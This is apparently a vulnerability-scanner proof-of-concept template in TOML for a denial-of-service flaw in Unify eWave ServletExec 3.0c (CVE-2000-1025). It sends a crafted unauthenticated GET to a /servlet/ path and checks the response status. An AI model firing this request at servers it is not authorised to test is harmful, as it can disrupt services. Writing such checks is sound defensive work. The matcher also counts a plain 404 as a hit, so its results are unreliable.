[info]
author = "ave"
description = "通过向目标服务器发送包含 /servlet/ 路径的特制请求，触发 ServletExec JSP/Java servlet 引擎异常，验证服务是否出现拒绝服务。攻击者无需认证即可利用。"
id = "POC-AVE-2000-0749"
name = "Unify eWave ServletExec 3.0c 拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0749"]
vuln_id = [
    "CVE-2000-1025",
    "AVE-2000-0749",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
    404,
]
type = "status"
